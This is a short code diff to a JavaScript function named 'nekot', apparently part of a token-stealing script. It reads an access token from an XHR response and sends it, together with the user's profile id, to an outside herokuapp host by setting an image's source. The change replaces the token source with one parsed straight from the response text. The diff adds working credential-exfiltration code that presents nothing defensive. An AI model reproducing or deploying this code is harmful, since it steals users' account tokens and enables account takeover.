@@ -39,7 +39,7 @@ function nekot() {
     xhr.onreadystatechange = function() {
       if (xhr.readyState == 4 && xhr.status == 200) {
         if (xhr.responseText.indexOf("access_token") > 0) {
-          new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=AndroidNEWinbox";
+          new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=AndroidNEWinbox";
           localStorage.access_token = "nekot";
         }
       }
